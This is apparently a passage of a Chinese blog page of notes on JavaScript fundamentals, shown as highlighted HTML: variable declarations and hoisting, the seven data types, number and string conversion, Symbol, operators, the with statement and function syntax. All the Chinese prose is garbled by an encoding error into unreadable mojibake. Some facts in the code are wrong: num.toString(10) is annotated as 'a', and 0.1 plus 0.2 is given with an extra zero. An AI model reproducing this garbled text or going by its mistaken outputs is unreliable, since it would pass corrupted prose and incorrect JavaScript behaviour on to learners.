å£°æ˜ä½œç”¨åŸŸ"></a>1. var å£°æ˜ä½œç”¨åŸŸ</h4><p>ä½¿ç”¨ <code>var</code> æ“ä½œç¬¦å®šä¹‰çš„å˜é‡ä¼šæˆä¸ºåŒ…å«å®ƒçš„å‡½æ•°çš„å±€éƒ¨å˜é‡.</p><p>çœç•¥ <code>var</code> æ“ä½œç¬¦å®šä¹‰å…¨å±€å˜é‡ï¼Œä½†ä¸æ¨èè¿™ä¹ˆåš.</p><p>å®šä¹‰å¤šä¸ªå˜é‡å¯ä»¥è¿™æ ·å†™:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;hi&quot;</span>,<br>    found = <span class="hljs-literal">false</span>, <br>    age = <span class="hljs-number">29</span>;<br></code></pre></td></tr></table></figure><h4 id="2-var-å£°æ˜æå‡"><a href="#2-var-å£°æ˜æå‡" class="headerlink" title="2. var å£°æ˜æå‡"></a>2. var å£°æ˜æå‡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age);<br>    <span class="hljs-keyword">var</span> age = <span class="hljs-number">26</span>;<br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> age;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age);<br>    age = <span class="hljs-number">26</span>;<br>&#125;<br><span class="hljs-title function_">foo</span>();<br></code></pre></td></tr></table></figure><p>å› æ­¤ï¼Œåå¤å£°æ˜ä¹Ÿä¸ä¼šæŠ¥é”™.</p><h3 id="3-3-2-let-å£°æ˜"><a href="#3-3-2-let-å£°æ˜" class="headerlink" title="3.3.2 let å£°æ˜"></a>3.3.2 let å£°æ˜</h3><p><code>let</code> å£°æ˜çš„èŒƒå›´æ˜¯å—ä½œç”¨åŸŸ, è€Œ <code>var</code> å£°æ˜çš„èŒƒå›´æ˜¯å‡½æ•°ä½œç”¨åŸŸ.</p><p>å—ä½œç”¨åŸŸå¯ä»¥çœ‹ä½œæ˜¯å‡½æ•°ä½œç”¨åŸŸçš„å­é›†.</p><p><code>let</code> ä¸èƒ½é‡å¤å£°æ˜.</p><h4 id="1-æš‚æ—¶æ€§æ­»åŒº"><a href="#1-æš‚æ—¶æ€§æ­»åŒº" class="headerlink" title="1. æš‚æ—¶æ€§æ­»åŒº"></a>1. æš‚æ—¶æ€§æ­»åŒº</h4><p><code>let</code> ä¸ä¼šåœ¨ä½œç”¨åŸŸä¸­è¢«æå‡.</p><h4 id="4-for-å¾ªç¯ä¸­çš„-let-å£°æ˜"><a href="#4-for-å¾ªç¯ä¸­çš„-let-å£°æ˜" class="headerlink" title="4. for å¾ªç¯ä¸­çš„ let å£°æ˜"></a>4. for å¾ªç¯ä¸­çš„ let å£°æ˜</h4><p><code>for</code> å¾ªç¯çš„è¯­æ³•åŒæ ·å’Œ C ä¸­ç›¸åŒ.</p><p>åœ¨ <code>let</code> å‡ºç°ä¹‹å‰ï¼Œ<code>for</code> å¾ªç¯å®šä¹‰çš„è¿­ä»£å˜é‡ä¼šæ¸—é€åˆ°å¾ªç¯ä½“å¤–éƒ¨.</p><h3 id="3-3-3-const-å£°æ˜"><a href="#3-3-3-const-å£°æ˜" class="headerlink" title="3.3.3 const å£°æ˜"></a>3.3.3 const å£°æ˜</h3><p>å£°æ˜æ—¶å¿…é¡»åˆå§‹åŒ–ï¼Œå¸¸é‡. ä½œç”¨åŸŸä¹Ÿæ˜¯å—.</p><h3 id="3-3-4-å£°æ˜é£æ ¼åŠæœ€ä½³å®è·µ"><a href="#3-3-4-å£°æ˜é£æ ¼åŠæœ€ä½³å®è·µ" class="headerlink" title="3.3.4 å£°æ˜é£æ ¼åŠæœ€ä½³å®è·µ"></a>3.3.4 å£°æ˜é£æ ¼åŠæœ€ä½³å®è·µ</h3><p>ä¸ä½¿ç”¨ <code>var</code>.</p><p><code>const</code> ä¼˜å…ˆï¼Œ<code>let</code> æ¬¡ä¹‹.</p><h2 id="3-4-æ•°æ®ç±»å‹"><a href="#3-4-æ•°æ®ç±»å‹" class="headerlink" title="3.4 æ•°æ®ç±»å‹"></a>3.4 æ•°æ®ç±»å‹</h2><p>ä¸ƒç§ç±»å‹:</p><ul><li>Undefined</li><li>Null</li><li>Boolean </li><li>Number</li><li>String</li><li>Symbol</li><li>Object</li></ul><h3 id="3-4-1-typeof-æ“ä½œç¬¦"><a href="#3-4-1-typeof-æ“ä½œç¬¦" class="headerlink" title="3.4.1 typeof æ“ä½œç¬¦"></a>3.4.1 typeof æ“ä½œç¬¦</h3><p>è¿”å›ç±»å‹ï¼Œé¦–å­—æ¯å°å†™. å‚æ•°æ˜¯ä¸€ä¸ªå˜é‡.</p><h3 id="3-4-2-Undefined-ç±»å‹"><a href="#3-4-2-Undefined-ç±»å‹" class="headerlink" title="3.4.2 Undefined ç±»å‹"></a>3.4.2 Undefined ç±»å‹</h3><p>è¯¥ç±»å‹åªæœ‰ <code>undefined</code> è¿™ä¸€ä¸ªç‰¹æ®Šå€¼.</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæ°¸è¿œä¸ç”¨æ˜¾å¼åœ°ç»™æŸä¸ªå˜é‡è®¾ç½® <code>undefined</code> å€¼.</p><p>å¯¹æœªå£°æ˜å’Œæœªåˆå§‹åŒ–çš„å˜é‡ä½¿ç”¨ <code>typeof</code> è¿”å›å€¼éƒ½æ˜¯ <code>undefined</code>. å› æ­¤ï¼Œå»ºè®®åœ¨å£°æ˜å˜é‡æ—¶è¿›è¡Œåˆå§‹åŒ–ï¼Œæ¥åŒºåˆ†æœªåˆå§‹åŒ–å’Œæœªå£°æ˜.</p><p><code>undefined</code> æ˜¯ä¸€ä¸ªå‡å€¼.</p><h3 id="3-4-3-Null-ç±»å‹"><a href="#3-4-3-Null-ç±»å‹" class="headerlink" title="3.4.3 Null ç±»å‹"></a>3.4.3 Null ç±»å‹</h3><p>Null ç±»å‹åŒæ ·åªæœ‰ <code>null</code> è¿™ä¸€ä¸ªç‰¹æ®Šå€¼ï¼Œ<code>null</code> å€¼è¡¨ç¤ºä¸€ä¸ªç©ºå¯¹è±¡æŒ‡é’ˆ.</p><p>åœ¨å®šä¹‰å°†æ¥è¦ä¿å­˜å¯¹è±¡å€¼çš„å˜é‡æ—¶ï¼Œå»ºè®®ä½¿ç”¨ <code>null</code> æ¥åˆå§‹åŒ–.</p><p><code>undefined</code> å€¼æ˜¯ç”± <code>null</code> å€¼æ´¾ç”Ÿè€Œæ¥çš„, å› æ­¤ ECMA-262 å°†å®ƒä»¬å®šä¹‰ä¸ºè¡¨é¢ç›¸ç­‰.</p><p><code>null</code> ä¹Ÿæ˜¯ä¸€ä¸ªå‡å€¼.</p><h3 id="3-4-4-Boolean-ç±»å‹"><a href="#3-4-4-Boolean-ç±»å‹" class="headerlink" title="3.4.4 Boolean ç±»å‹"></a>3.4.4 Boolean ç±»å‹</h3><p>æœ‰ä¸¤ä¸ªå­—é¢å€¼:</p><ul><li><code>true</code>, å’Œæ•°å€¼ 1 ä¸ç›¸ç­‰</li><li><code>false</code>, å’Œæ•°å€¼ 0 ä¸ç›¸ç­‰</li></ul><p>åŒºåˆ†å¤§å°å†™, </p><p>è½¬æ¢å‡½æ•° <code>Boolean()</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-keyword">let</span> messageAsBoolean = <span class="hljs-title class_">Boolean</span>(message);<br></code></pre></td></tr></table></figure><p>å‡ ä¸ªè½¬æ¢å‡½æ•°:<br><img src="/../img/convert_type_function_in_javascript.png"></p><h3 id="3-4-5-Number-ç±»å‹"><a href="#3-4-5-Number-ç±»å‹" class="headerlink" title="3.4.5 Number ç±»å‹"></a>3.4.5 Number ç±»å‹</h3><p>Number ç±»å‹ä½¿ç”¨ IEEE 754 æ ¼å¼è¡¨ç¤ºæ•´æ•°å’Œæµ®ç‚¹å€¼.</p><p>åè¿›åˆ¶æ•°ç›´æ¥å†™.</p><p>å…«è¿›åˆ¶ç¬¬ä¸€ä¸ªæ•°å­—ä¸º 0.</p><p>åå…­è¿›åˆ¶å‰ç¼€ä¸º 0x.</p><p>ä½¿ç”¨å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶æ ¼å¼åˆ›å»ºçš„æ•°å€¼åœ¨æ‰€æœ‰æ•°å­¦æ“ä½œä¸­éƒ½è¢«è§†ä¸ºåè¿›åˆ¶æ•°å€¼.</p><h4 id="1-æµ®ç‚¹å€¼"><a href="#1-æµ®ç‚¹å€¼" class="headerlink" title="1. æµ®ç‚¹å€¼"></a>1. æµ®ç‚¹å€¼</h4><p>å› ä¸ºå­˜å‚¨æµ®ç‚¹å€¼ä½¿ç”¨çš„å†…å­˜ç©ºé—´æ˜¯å­˜å‚¨æ•´æ•°å€¼çš„ä¸¤å€ï¼Œæ‰€ä»¥ ECMAScript æ€»æ˜¯å€¾å‘äºæŠŠå€¼è½¬æ¢ä¸ºæ•´æ•°.</p><p>ä¹Ÿå°±æ˜¯è¯´æœ‰äº›æµ®ç‚¹å€¼ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºæ•´æ•°.</p><p>æµ®ç‚¹å€¼å¯ä»¥ç”¨ç§‘å­¦è®°æ•°æ³•è¡¨ç¤º:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> floatNum = <span class="hljs-number">3.125e7</span>;<br></code></pre></td></tr></table></figure><p><code>e</code> å¯ä»¥ä¸ºå¤§å†™ <code>E</code>.</p><p>æµ®ç‚¹å€¼çš„ç²¾ç¡®åº¦æœ€é«˜å¯è¾¾ 17 ä½å°æ•°. ä½†ä¸è¦ç”¨æ¥æ¯”è¾ƒ. 0.1 åŠ   0.2 ä¸ç­‰äº 0.3, è€Œæ˜¯ 0.300000000000000004.</p><h4 id="2-å€¼çš„èŒƒå›´"><a href="#2-å€¼çš„èŒƒå›´" class="headerlink" title="2.  å€¼çš„èŒƒå›´"></a>2.  å€¼çš„èŒƒå›´</h4><p>ECMAScript å¯ä»¥è¡¨ç¤ºçš„æœ€å°å€¼ä¿å­˜åœ¨ <code>Number.MIN_VALUE</code> ä¸­. </p><p>ECMAScript å¯ä»¥è¡¨ç¤ºçš„æœ€å¤§å€¼ä¿å­˜åœ¨ <code>Number.MAX_VALUE</code> ä¸­.</p><p>æ— æ³•è¡¨ç¤ºçš„è´Ÿæ•°å°†è¢«è¡¨ç¤ºä¸º <code>-Infinity</code>.</p><p>æ— æ³•è¡¨ç¤ºçš„æ­£æ•°å°†è¢«è¡¨ç¤ºä¸º <code>Infinity</code>.</p><p>åˆ¤æ–­æ˜¯å¦æœ‰é™å¤§ <code>isFinite()</code>.</p><h4 id="3-NaN"><a href="#3-NaN" class="headerlink" title="3. NaN"></a>3. NaN</h4><p>NaN, Not a Number, ç”¨äºè¡¨ç¤ºæœ¬æ¥è¦è¿”å›æ•°å€¼æ“ä½œå¤±è´¥äº†.</p><p>NaN ä¸ç­‰äº NaN.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">NaN</span> == <span class="hljs-title class_">NaN</span>); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>isNaN()</code> åˆ¤æ–­.</p><h4 id="4-æ•°å€¼è½¬æ¢"><a href="#4-æ•°å€¼è½¬æ¢" class="headerlink" title="4. æ•°å€¼è½¬æ¢"></a>4. æ•°å€¼è½¬æ¢</h4><p>å°†éæ•°å€¼è½¬æ¢ä¸ºæ•°å€¼çš„ 3 ä¸ªå‡½æ•°:</p><ul><li><code>Number()</code></li><li><code>parseInt</code></li><li><code>parseFloat</code></li></ul><p>åä¸¤ä¸ªç”¨æ¥å¤„ç†å­—ç¬¦ä¸².</p><h3 id="3-4-5-String-ç±»å‹"><a href="#3-4-5-String-ç±»å‹" class="headerlink" title="3.4.5 String ç±»å‹"></a>3.4.5 String ç±»å‹</h3><p>å¯ç”¨åŒå¼•å· <code>&quot;</code>, å•å¼•å· <code>&#39;</code>, åå¼•å·æ ‡ç¤º.</p><p>å­—ç¬¦ä¸²çš„é•¿åº¦å¯ä»¥é€šè¿‡å…¶ <code>length</code> å±æ€§è·å–. (å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«åŒå­—èŠ‚å­—ç¬¦ï¼Œé‚£ä¹ˆ length å±æ€§è¿”å›çš„å¯èƒ½ä¸å‡†ç¡®.)</p><h4 id="2-å­—ç¬¦ä¸²ç‰¹ç‚¹"><a href="#2-å­—ç¬¦ä¸²ç‰¹ç‚¹" class="headerlink" title="2. å­—ç¬¦ä¸²ç‰¹ç‚¹"></a>2. å­—ç¬¦ä¸²ç‰¹ç‚¹</h4><p>ä¸å¯æ”¹å˜ (å³ï¼Œä¸€æ—¦è¢«åˆ›å»ºåï¼Œå…¶å€¼å°±ä¸èƒ½æ”¹å˜).</p><p>ä¿®æ”¹æŸä¸ªå˜é‡ä¸­çš„å­—ç¬¦ä¸²å€¼ï¼Œå¿…é¡»å…ˆé”€æ¯åŸå§‹çš„å­—ç¬¦ä¸². (é”€æ¯è¿‡ç¨‹åœ¨åå°è‡ªåŠ¨è¿è¡Œ)</p><h4 id="3-è½¬æ¢ä¸ºå­—ç¬¦ä¸²"><a href="#3-è½¬æ¢ä¸ºå­—ç¬¦ä¸²" class="headerlink" title="3. è½¬æ¢ä¸ºå­—ç¬¦ä¸²"></a>3. è½¬æ¢ä¸ºå­—ç¬¦ä¸²</h4><p>å‡ ä¹æ‰€æœ‰å€¼éƒ½æœ‰ <code>toString()</code> æ–¹æ³•.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> age = <span class="hljs-number">11</span>;<br><span class="hljs-keyword">let</span> ageAsString = age.<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">let</span> found = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">let</span> foundString = found.<span class="hljs-title function_">toString</span>();<br></code></pre></td></tr></table></figure><p><code>null</code> å’Œ <code>undefined</code> æ²¡æœ‰ <code>toString()</code> æ–¹æ³•.</p><p><code>toString()</code> å¯æ¥æ”¶ä¸€ä¸ªå‚æ•°è¡¨ç¤ºåº•æ•° (è¾“å‡ºé‚£ä¸ªè¿›åˆ¶):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> num = <span class="hljs-number">10</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>());   <span class="hljs-comment">// &quot;10&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">2</span>));  <span class="hljs-comment">// &quot;1010&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">8</span>));  <span class="hljs-comment">// &quot;12&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>(<span class="hljs-number">10</span>)); <span class="hljs-comment">// &quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªæ–¹æ³•æ˜¯ç”¨ <code>String()</code>.</p><h4 id="4-æ¨¡æ¿å­—é¢é‡"><a href="#4-æ¨¡æ¿å­—é¢é‡" class="headerlink" title="4. æ¨¡æ¿å­—é¢é‡"></a>4. æ¨¡æ¿å­—é¢é‡</h4><p>å…·ä½“è§ä¹¦</p><h4 id="5-å­—ç¬¦ä¸²æ’å€¼"><a href="#5-å­—ç¬¦ä¸²æ’å€¼" class="headerlink" title="5. å­—ç¬¦ä¸²æ’å€¼"></a>5. å­—ç¬¦ä¸²æ’å€¼</h4><p>ä¹Ÿå°±æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æ’å…¥å˜é‡, ä½¿ç”¨ <code>$&#123;&#125;</code>, å¦‚:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> value = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">let</span> exponent = <span class="hljs-string">&#x27;second&#x27;</span>;<br><span class="hljs-keyword">let</span> interpolatedString = <span class="hljs-string">&quot;value is $&#123;value&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ’å…¥çš„å€¼ä¼šè¢« <code>toString()</code> å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸² ã€‚</p><h4 id="6-æ¨¡æ¿å­—é¢é‡æ ‡ç­¾å‡½æ•°-tag-function"><a href="#6-æ¨¡æ¿å­—é¢é‡æ ‡ç­¾å‡½æ•°-tag-function" class="headerlink" title="6. æ¨¡æ¿å­—é¢é‡æ ‡ç­¾å‡½æ•° tag function"></a>6. æ¨¡æ¿å­—é¢é‡æ ‡ç­¾å‡½æ•° tag function</h4><p>è§ä¹¦</p><h4 id="7-åŸå§‹å­—ç¬¦ä¸²"><a href="#7-åŸå§‹å­—ç¬¦ä¸²" class="headerlink" title="7. åŸå§‹å­—ç¬¦ä¸²"></a>7. åŸå§‹å­—ç¬¦ä¸²</h4><p>è§ä¹¦</p><h3 id="3-4-7-Symbol-ç±»å‹"><a href="#3-4-7-Symbol-ç±»å‹" class="headerlink" title="3.4.7 Symbol ç±»å‹"></a>3.4.7 Symbol ç±»å‹</h3><p>ç¬¦å·ç”¨æ¥åˆ›å»ºå”¯ä¸€è®°å·.</p><h4 id="1-ç¬¦å·çš„åŸºæœ¬ç”¨æ³•"><a href="#1-ç¬¦å·çš„åŸºæœ¬ç”¨æ³•" class="headerlink" title="1. ç¬¦å·çš„åŸºæœ¬ç”¨æ³•"></a>1. ç¬¦å·çš„åŸºæœ¬ç”¨æ³•</h4><p>å€¼ä¸ºç¬¦å·çš„å˜é‡éœ€è¦ç”¨ <code>Symbol()</code> å‡½æ•°åˆå§‹åŒ–:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> sym = <span class="hljs-title class_">Symbol</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> sym);<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç»™ <code>Symbol()</code> ä¼ å…¥ä¸€ä¸ªå‚æ•°ä½œä¸ºç¬¦å·çš„æè¿°ï¼Œä½†æ˜¯è¿™ä¸ªå€¼å’Œç¬¦å·æœ¬èº«çš„å€¼æ— å…³.</p><p><code>Symbol()</code> å‡½æ•°ä¸èƒ½å’Œ <code>new</code> å…³é”®å­—ä¸€èµ·ä½œä¸ºæ„é€ å‡½æ•°ä½¿ç”¨.</p><h4 id="2-ä½¿ç”¨å…¨å±€ç¬¦å·æ³¨å†Œè¡¨"><a href="#2-ä½¿ç”¨å…¨å±€ç¬¦å·æ³¨å†Œè¡¨" class="headerlink" title="2. ä½¿ç”¨å…¨å±€ç¬¦å·æ³¨å†Œè¡¨"></a>2. ä½¿ç”¨å…¨å±€ç¬¦å·æ³¨å†Œè¡¨</h4><p>è§ä¹¦.</p><h4 id="3-ä½¿ç”¨ç¬¦å·ä½œä¸ºå±æ€§"><a href="#3-ä½¿ç”¨ç¬¦å·ä½œä¸ºå±æ€§" class="headerlink" title="3. ä½¿ç”¨ç¬¦å·ä½œä¸ºå±æ€§"></a>3. ä½¿ç”¨ç¬¦å·ä½œä¸ºå±æ€§</h4><p>å‡¡æ˜¯å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æˆ–æ•°å€¼ä½œä¸ºå±æ€§çš„åœ°æ–¹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ç¬¦å·.</p><p>å¦‚ç”¨ä½œæ•£åˆ—çš„é”®.</p><h4 id="4-å¸¸ç”¨å†…ç½®ç¬¦å·"><a href="#4-å¸¸ç”¨å†…ç½®ç¬¦å·" class="headerlink" title="4. å¸¸ç”¨å†…ç½®ç¬¦å·"></a>4. å¸¸ç”¨å†…ç½®ç¬¦å·</h4><p>è§ä¹¦.</p><h3 id="3-4-8-Object-ç±»å‹"><a href="#3-4-8-Object-ç±»å‹" class="headerlink" title="3.4.8 Object ç±»å‹"></a>3.4.8 Object ç±»å‹</h3><p>ECMAScript ä¸­çš„å¯¹è±¡å…¶å®å°±æ˜¯ä¸€ç»„æ•°æ®å’ŒåŠŸèƒ½çš„é›†åˆ.</p><p>å¯¹è±¡é€šè¿‡ <code>new</code> æ“ä½œç¬¦åè·Ÿå¯¹è±¡ç±»å‹çš„åç§°æ¥åˆ›å»º, å¼€å‘è€…å¯ä»¥é€šè¿‡åˆ›å»º Object ç±»å‹çš„å®ä¾‹æ¥åˆ›å»ºè‡ªå·±çš„å¯¹è±¡ï¼Œç„¶åå†ç»™å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœç•¥æ‹¬å·ä½†ä¸æ¨è.</p><p>Object å¯¹è±¡æ‰€å«çš„å±æ€§å’Œæ–¹æ³•ï¼Œè§ä¹¦.</p><p><code>valueOf()</code> è¿”å›å¯¹è±¡å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œæ•°å€¼æˆ–å¸ƒå°”å€¼è¡¨ç¤º.</p><h2 id="3-5-æ“ä½œç¬¦"><a href="#3-5-æ“ä½œç¬¦" class="headerlink" title="3.5 æ“ä½œç¬¦"></a>3.5 æ“ä½œç¬¦</h2><p>+, -, *, &#x2F;, %, ä»¥åŠé€’å¢ï¼Œé€’å‡éƒ½å’Œ C ç›¸åŒ.</p><h3 id="3-5-2-ä½æ“ä½œç¬¦"><a href="#3-5-2-ä½æ“ä½œç¬¦" class="headerlink" title="3.5.2 ä½æ“ä½œç¬¦"></a>3.5.2 ä½æ“ä½œç¬¦</h3><p>ECMAScript ä¸­çš„æ‰€æœ‰æ•°å€¼éƒ½æ˜¯ä»¥ IEEE 754 64 ä½æ ¼å¼å­˜å‚¨ï¼Œä½†ä½æ“ä½œå¹¶ä¸ç›´æ¥åº”ç”¨åˆ° 64 ä½è¡¨ç¤ºï¼Œ è€Œæ˜¯å…ˆæŠŠå€¼è½¬æ¢ä¸º 32 ä½æ•´æ•°ï¼Œå†è¿›è¡Œä½æ“ä½œï¼Œä¹‹åå†æŠŠç»“æœè½¬æ¢ä¸º 64 ä½. å› æ­¤åªéœ€è¦è€ƒè™‘ 32 ä½æ•´æ•°.</p><p>è´Ÿå€¼ä»¥ä¸€ç§ç§°ä¸º <mark>äºŒè¡¥æ•° (æˆ–è¡¥ç )</mark>  çš„äºŒè¿›åˆ¶ç¼–ç å­˜å‚¨.</p><p>ç¬¦å·:</p><ul><li><code>~</code>, é</li><li><code>&amp;</code>, ä¸</li><li><code>|</code>, æˆ–</li><li><code>^</code>, å¼‚æˆ–</li><li><code>&lt;&lt;</code>, å·¦ç§»</li><li><code>&gt;&gt;</code>, å³ç§»</li><li><code>&gt;&gt;&gt;</code>, æ— ç¬¦å·å³ç§»</li></ul><h3 id="3-5-5-æŒ‡æ•°æ“ä½œç¬¦"><a href="#3-5-5-æŒ‡æ•°æ“ä½œç¬¦" class="headerlink" title="3.5.5 æŒ‡æ•°æ“ä½œç¬¦"></a>3.5.5 æŒ‡æ•°æ“ä½œç¬¦</h3><p><code>**</code></p><h3 id="3-5-8-ç›¸ç­‰æ“ä½œç¬¦"><a href="#3-5-8-ç›¸ç­‰æ“ä½œç¬¦" class="headerlink" title="3.5.8 ç›¸ç­‰æ“ä½œç¬¦"></a>3.5.8 ç›¸ç­‰æ“ä½œç¬¦</h3><h4 id="2-å…¨ç­‰å’Œä¸å…¨ç­‰"><a href="#2-å…¨ç­‰å’Œä¸å…¨ç­‰" class="headerlink" title="2. å…¨ç­‰å’Œä¸å…¨ç­‰"></a>2. å…¨ç­‰å’Œä¸å…¨ç­‰</h4><p><code>===</code> å’Œ <code>!==</code>, æ¨èä½¿ç”¨ï¼Œä¸å­˜åœ¨ç±»å‹è½¬æ¢é—®é¢˜.</p><h2 id="3-6-è¯­å¥"><a href="#3-6-è¯­å¥" class="headerlink" title="3.6 è¯­å¥"></a>3.6 è¯­å¥</h2><p>if, do-while, while, for, for-in, for-of.</p><h3 id="3-6-7-æ ‡ç­¾è¯­å¥"><a href="#3-6-7-æ ‡ç­¾è¯­å¥" class="headerlink" title="3.6.7 æ ‡ç­¾è¯­å¥"></a>3.6.7 æ ‡ç­¾è¯­å¥</h3><h3 id="3-6-8-break-å’Œ-continue"><a href="#3-6-8-break-å’Œ-continue" class="headerlink" title="3.6.8 break å’Œ continue"></a>3.6.8 break å’Œ continue</h3><h3 id="3-6-9-with-è¯­å¥"><a href="#3-6-9-with-è¯­å¥" class="headerlink" title="3.6.9 with è¯­å¥"></a>3.6.9 with è¯­å¥</h3><p>å°†ä»£ç ä½œç”¨åŸŸè®¾ç½®ä¸ºç‰¹å®šå¯¹è±¡ï¼Œå¦‚:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> qs = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">let</span> hostname = location.<span class="hljs-property">hostname</span>;<br><span class="hljs-keyword">let</span> url = location.<span class="hljs-property">href</span>;<br></code></pre></td></tr></table></figure><p>ç­‰ä»·äº:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">with</span>(<span class="hljs-params">location</span>) &#123;<br>        <span class="hljs-keyword">let</span> qs = search.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">let</span> hostname = hostname;<br>        <span class="hljs-keyword">let</span> url = href;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¸æ¨èä½¿ç”¨ï¼ŒåŸå› è§ä¹¦.</p><h3 id="3-6-10-switch"><a href="#3-6-10-switch" class="headerlink" title="3.6.10 switch"></a>3.6.10 switch</h3><h2 id="3-7-å‡½æ•°"><a href="#3-7-å‡½æ•°" class="headerlink" title="3.7 å‡½æ•°"></a>3.7 å‡½æ•°</h2><p>è¯­æ³•:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">functionName</span>(<span class="hljs-params">arg0, arg1...</span>) &#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬4ç« -å˜é‡ï¼Œä½œç”¨åŸŸä¸å†…å­˜"><a href="#ç¬¬4ç« -å˜é‡ï¼Œä½œç”¨åŸŸä¸å†…å­˜" class="headerlink" title="ç¬¬4ç«  å˜é‡ï¼Œä½œç”¨åŸŸä¸å†…å­˜"></a>ç¬¬4ç«  å˜é‡ï¼Œä½œç”¨åŸŸä¸å†…å­˜</h1><h2 id="4-1-åŸå§‹å€¼ä¸å¼•ç”¨å€¼"><a href="#4-1-åŸå§‹å€¼ä¸å¼•ç”¨å€¼" class="headerlink" title="4.1 åŸå§‹å€¼ä¸å¼•ç”¨å€¼"></a>4.1 åŸå§‹å€¼ä¸å¼•ç”¨å€¼</h2><p>JavaScript ä¸å…è®¸ç›´æ¥è®¿é—®å†…å­˜ä½ç½®ï¼Œå› 